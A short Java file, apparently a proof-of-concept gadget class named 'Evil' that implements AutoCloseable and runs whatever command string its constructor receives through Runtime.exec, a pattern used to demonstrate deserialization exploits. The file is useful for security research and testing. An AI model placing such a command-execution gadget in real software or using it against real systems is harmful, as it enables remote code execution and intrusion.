package AutoCloseable;

import java.io.IOException;

public class Evil implements AutoCloseable {
    public Evil(String cmd) {
        try {
            Runtime.getRuntime().exec(cmd);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public void close() throws Exception {
    }
}